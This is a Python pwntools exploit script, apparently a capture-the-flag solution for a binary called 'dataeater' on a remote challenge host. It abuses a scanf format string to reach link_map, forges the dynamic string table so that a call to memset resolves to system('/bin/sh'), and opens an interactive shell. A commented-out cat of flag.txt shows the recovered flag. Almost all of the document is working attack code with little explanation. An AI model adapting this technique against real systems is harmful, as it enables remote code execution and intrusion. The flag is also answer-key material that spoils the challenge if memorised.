#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template dataeater
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('dataeater')
libc = ELF('./libc-2.31.so')
HOST, PORT = "mc.ax 31869".split()

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b __isoc99_scanf
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# format_string = b"%10$d"
# rdx = 0xa6424303125 /* '%10$d\n' */
# â–º 0x7f25df45261e <__vfscanf_internal+23198>    mov    dword ptr [rdx], eax

# offset to link_map = 0x20 / 32
format_string = b"%s%32$s"
io.sendline(format_string)

payload = b""
# write /bin/sh to buf
payload += b"/bin/sh\0"
# write fake STRTAB address as buf+0x10-0x37 where 0x37 is offset for memset\0 string in
# original STRTAB
# so finally the equation STRTAB+0x37 will give buf+0x10 == 'system\0'
payload += p64(exe.sym["buf"] + 0x10 - exe.section(".dynstr").index(b"memset\0"))
# write system\0 to buf+0x10
payload += b"system\0 "
# align
payload += p64(0)*0xd
# write address of buf as fake STRTAB address pointer
payload += p64(exe.sym["buf"])[:-1]

io.sendline(payload)

io.interactive()

# $ cat flag.txt
# dice{1nfin1t3_f1v3_lin3_ch4lls_f46297a09e671c6a}
